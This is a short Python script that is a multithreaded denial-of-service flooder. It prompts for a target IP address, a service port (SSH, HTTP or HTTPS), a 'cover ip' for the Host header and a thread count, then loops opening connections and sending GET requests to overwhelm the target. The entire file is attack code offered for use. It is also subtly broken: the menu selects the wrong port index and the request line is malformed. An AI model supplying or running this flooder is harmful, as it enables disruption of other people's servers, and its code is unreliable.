import socket
import threading # note  : python doesn't provide real multi-threading ,

target  = input("Enter the target's ip address : ")
port = [22,80,443]
choice = input(""" Choose the targeted service :
	1 - SSH
	2 - HTTP
	3 - HTTPS
	""")
port=port[int(choice)]
cover_ip = input("Enter the cover ip : ") # ip addr to send in the header
thread = input("Enter the number of threads : ") # number of connections to establish
established_connection = 0

def attack():
	while True: # loop to open/close connection
	 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket to be used for sending data
	 s.connect((target,port)) # establishing a connection double parentheses is necessary since s.connect function takes on argument 
	 s.sendto(("GET /" + target + "HTTP/1-1\r\n").encode("ascii"),(target,port))
	 s.sendto(("HOST: " + cover_ip + "\r\n\r\n").encode("ascii"),(target,port))
	 s.close()
	 global established_connection
	 established_connection += 1
	 if established_connection % 100 == 0: # prints the number of threads after 100 connection since printing slows down the script
	 	print(established_connection)
for i in range(int(thread)):
	thread = threading.Thread(target=attack) # pointing the multi-threading function to the attacking function
	thread.start()